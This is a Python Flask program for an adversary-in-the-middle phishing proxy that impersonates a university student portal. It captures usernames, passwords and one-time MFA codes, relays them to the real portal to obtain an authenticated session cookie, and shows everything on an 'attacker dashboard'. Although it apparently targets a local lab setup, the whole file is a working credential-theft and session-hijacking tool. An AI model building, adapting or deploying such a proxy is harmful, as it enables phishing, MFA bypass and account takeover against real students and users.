from flask import Flask, request, redirect, render_template_string, session
import requests as http_requests
import time
from datetime import datetime

app = Flask(__name__)
app.secret_key = "fake_portal_secret_key"

import socket

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

LOCAL_IP = get_local_ip()
REAL_PORTAL = f"http://{LOCAL_IP}:5000"

# Store captured credentials
captured_data = []


# HTML Templates

FAKE_LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>University Student Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1e293b, #0f766e);
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: white;
            width: 400px;
            padding: 32px;
            border-radius: 18px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.25);
        }
        h1 { margin: 0 0 8px 0; color: #0f172a; text-align: center; }
        p.subtitle { margin: 0 0 24px 0; text-align: center; color: #475569; font-size: 14px; }
        label { display: block; margin-bottom: 6px; color: #1e293b; font-weight: bold; font-size: 14px; }
        input { width: 100%; box-sizing: border-box; padding: 12px; margin-bottom: 16px;
                border: 1px solid #cbd5e1; border-radius: 10px; font-size: 14px; }
        button { width: 100%; background: #0f766e; color: white; border: none;
                 padding: 12px; border-radius: 10px; font-size: 15px; cursor: pointer; }
        button:hover { background: #0d5f59; }
        .msg { margin-bottom: 16px; padding: 10px 12px; border-radius: 10px; font-size: 14px; }
        .error { background: #fee2e2; color: #991b1b; }
        .footer { margin-top: 14px; text-align: center; color: #64748b; font-size: 12px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>University Student Portal</h1>
        <p class="subtitle">Sign in to access your academic dashboard</p>

        {% if message %}
            <div class="msg error">{{ message }}</div>
        {% endif %}

        <form method="POST" action="/login">
            <label for="username">University Email / Username</label>
            <input id="username" name="username" type="text" placeholder="student@example.edu" required>

            <label for="password">Password</label>
            <input id="password" name="password" type="password" placeholder="Enter password" required>

            <button type="submit">Sign In</button>
        </form>

        <div class="footer">University Student Portal</div>
    </div>
</body>
</html>
"""

FAKE_MFA_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MFA Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1e293b, #0f766e);
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: white;
            width: 400px;
            padding: 32px;
            border-radius: 18px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.25);
        }
        h1 { margin: 0 0 8px 0; color: #0f172a; text-align: center; }
        p.subtitle { margin: 0 0 24px 0; text-align: center; color: #475569; font-size: 14px; }
        label { display: block; margin-bottom: 6px; color: #1e293b; font-weight: bold; font-size: 14px; }
        input { width: 100%; box-sizing: border-box; padding: 12px; margin-bottom: 16px;
                border: 1px solid #cbd5e1; border-radius: 10px; font-size: 18px;
                text-align: center; letter-spacing: 8px; }
        button { width: 100%; background: #0f766e; color: white; border: none;
                 padding: 12px; border-radius: 10px; font-size: 15px; cursor: pointer; }
        button:hover { background: #0d5f59; }
        .msg { margin-bottom: 16px; padding: 10px 12px; border-radius: 10px; font-size: 14px; }
        .error { background: #fee2e2; color: #991b1b; }
        .info { background: #e0f2fe; color: #075985; }
        .footer { margin-top: 14px; text-align: center; color: #64748b; font-size: 12px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Two-Factor Authentication</h1>
        <p class="subtitle">Enter the 4-digit verification code sent to your device</p>

        {% if message %}
            <div class="msg error">{{ message }}</div>
        {% endif %}

        <form method="POST" action="/verify-mfa">
            <label for="code">Verification Code</label>
            <input id="code" name="code" type="text" maxlength="4" placeholder="----" required autofocus>
            <button type="submit">Verify</button>
        </form>

        <div class="footer">University Student Portal</div>
    </div>
</body>
</html>
"""

FAKE_SUCCESS_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1e293b, #0f766e);
            margin: 0; min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
            color: white;
        }
        .card {
            background: white; width: 500px; padding: 32px;
            border-radius: 18px; box-shadow: 0 12px 40px rgba(0,0,0,0.25);
            color: #0f172a;
        }
        h1 { text-align: center; color: #166534; }
        .info { background: #dcfce7; color: #166534; padding: 14px; border-radius: 10px; margin: 16px 0; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Verification Successful</h1>
        <div class="info">
            Your identity has been verified. Redirecting to the student portal...
        </div>
        <p style="text-align:center; color: #64748b; font-size: 14px;">
            If you are not redirected automatically,
            <a href="http://127.0.0.1:5000">click here</a>.
        </p>
    </div>
</body>
</html>
"""

ATTACKER_DASHBOARD = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AiTM Attacker Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e293b; color: #e2e8f0; padding: 32px; }
        .container { max-width: 900px; margin: 0 auto; }
        h1 { color: #f87171; }
        .stat-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; margin-bottom: 24px; }
        .stat { background: #334155; border-radius: 12px; padding: 18px; text-align: center; }
        .stat .label { color: #94a3b8; font-size: 13px; }
        .stat .count { font-size: 36px; font-weight: bold; color: #f87171; }
        .card { background: #334155; border-radius: 12px; padding: 18px; margin-bottom: 14px; }
        .field { margin-bottom: 8px; }
        .field .label { color: #94a3b8; font-size: 12px; }
        .field .value { color: #fbbf24; font-family: monospace; word-break: break-all; }
        .meta { color: #64748b; font-size: 12px; margin-top: 8px; }
        .empty { color: #64748b; font-style: italic; }
        .tag { display: inline-block; padding: 3px 8px; border-radius: 6px; font-size: 11px;
               font-weight: bold; background: #dc2626; color: white; margin-bottom: 8px; }
    </style>
    <meta http-equiv="refresh" content="3">
</head>
<body>
    <div class="container">
        <h1>AiTM Phishing — Attacker Dashboard</h1>

        <div class="stat-grid">
            <div class="stat">
                <div class="label">Credentials Captured</div>
                <div class="count">{{ captures | length }}</div>
            </div>
            <div class="stat">
                <div class="label">MFA Codes Captured</div>
                <div class="count">{{ captures | selectattr('mfa_code') | list | length }}</div>
            </div>
            <div class="stat">
                <div class="label">Sessions Hijacked</div>
                <div class="count">{{ captures | selectattr('session_cookie') | list | length }}</div>
            </div>
        </div>

        {% if captures %}
            {% for c in captures | reverse %}
            <div class="card">
                <div class="tag">CAPTURED #{{ loop.revindex }}</div>
                <div class="field">
                    <div class="label">Username</div>
                    <div class="value">{{ c.username }}</div>
                </div>
                <div class="field">
                    <div class="label">Password</div>
                    <div class="value">{{ c.password }}</div>
                </div>
                {% if c.mfa_code %}
                <div class="field">
                    <div class="label">MFA Code</div>
                    <div class="value">{{ c.mfa_code }}</div>
                </div>
                {% endif %}
                {% if c.session_cookie %}
                <div class="field">
                    <div class="label">Hijacked Session Cookie</div>
                    <div class="value">{{ c.session_cookie }}</div>
                </div>
                {% endif %}
                <div class="meta">Captured at {{ c.time }}</div>
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">No credentials captured yet. Waiting for victim to log in at port 6000...</div>
        {% endif %}
    </div>
</body>
</html>
"""



# Routes

@app.route("/", methods=["GET"])
def home():
    return render_template_string(FAKE_LOGIN_PAGE, message=None)


@app.route("/login", methods=["POST"])
def fake_login():
    """
    Step 1: Capture username + password, forward to real portal.
    If real portal says MFA required, show MFA page.
    """
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n  [!] CREDENTIALS CAPTURED at {timestamp}")
    print(f"      Username: {username}")
    print(f"      Password: {password}")

    # Forward to real portal API
    try:
        resp = http_requests.post(
            f"{REAL_PORTAL}/login",
            json={"username": username, "password": password},
            timeout=5,
        )
        data = resp.json()
    except Exception as e:
        print(f"      ERROR forwarding to real portal: {e}")
        return render_template_string(FAKE_LOGIN_PAGE,
                                      message="Service temporarily unavailable. Please try again.")

    if resp.status_code == 401:
        # Wrong credentials、
        return render_template_string(FAKE_LOGIN_PAGE, message="Invalid credentials.")

    if data.get("status") == "mfa_required":
        # Password correct, MFA needed
        session["captured_username"] = username
        session["captured_password"] = password

        # Add to captured data
        captured_data.append({
            "username": username,
            "password": password,
            "mfa_code": None,
            "session_cookie": None,
            "time": timestamp,
        })

        print(f"      Real portal says MFA required")
        return render_template_string(FAKE_MFA_PAGE, message=None)

    # No MFA 
    captured_data.append({
        "username": username,
        "password": password,
        "mfa_code": None,
        "session_cookie": "N/A (no MFA)",
        "time": timestamp,
    })
    return render_template_string(FAKE_SUCCESS_PAGE)


@app.route("/verify-mfa", methods=["POST"])
def fake_mfa_verify():
    """
    Step 2: Capture MFA code, forward to real portal.
    If real portal verifies, we get the authenticated session.

    Flow: re-send password (real portal reuses existing MFA code if unexpired)
          then submit the MFA code the victim entered.
    """
    code = request.form.get("code", "").strip()
    username = session.get("captured_username", "")
    password = session.get("captured_password", "")

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n  [!] MFA CODE CAPTURED at {timestamp}")
    print(f"      Username: {username}")
    print(f"      MFA Code: {code}")

    # Forward MFA code to real portal
    try:
        proxy_session = http_requests.Session()

        # Step 1: Re-send password to establish MFA-pending state
        proxy_session.post(
            f"{REAL_PORTAL}/web-login",
            data={"username": username, "password": password},
            allow_redirects=False,
        )

        # Step 2: Submit the MFA code victim entered
        resp = proxy_session.post(
            f"{REAL_PORTAL}/mfa-verify",
            data={"code": code},
            allow_redirects=True,
        )

        # Check if MFA succeeded
        if resp.status_code == 200 and "Welcome" in resp.text:
            # Extract the session cookie from the proxy session
            real_session_cookie = proxy_session.cookies.get("session", "")

            print(f"      MFA VERIFIED — SESSION HIJACKED!")
            print(f"      Session cookie: {real_session_cookie[:50]}...")

            # Update the captured entry with MFA code and session
            for entry in reversed(captured_data):
                if entry["username"] == username and entry["mfa_code"] is None:
                    entry["mfa_code"] = code
                    entry["session_cookie"] = real_session_cookie
                    break

            return render_template_string(FAKE_SUCCESS_PAGE)

        else:
            print(f"      MFA verification failed on real portal")
            return render_template_string(FAKE_MFA_PAGE,
                                          message="Invalid or expired verification code. Please try again.")

    except Exception as e:
        print(f"      ERROR during MFA proxy: {e}")
        return render_template_string(FAKE_MFA_PAGE,
                                      message="Verification failed. Please try again.")


@app.route("/dashboard")
def attacker_dashboard():
    """Attacker's view of all captured credentials, MFA codes, and sessions."""
    return render_template_string(ATTACKER_DASHBOARD, captures=captured_data)


if __name__ == "__main__":
    print("=" * 65)
    print("  AiTM PHISHING PROXY — FAKE UNIVERSITY PORTAL")
    print("=" * 65)
    print(f"  Fake portal:       http://127.0.0.1:6001")
    print(f"  Attacker dashboard: http://127.0.0.1:6001/dashboard")
    print(f"  Real portal:       {REAL_PORTAL}")
    print("=" * 65)
    print()
    print("  Victim visits http://127.0.0.1:6000 (from phishing email)")
    print("  Attacker monitors http://127.0.0.1:6000/dashboard")
    print()
    app.run(host="0.0.0.0", port=6001, debug=False)
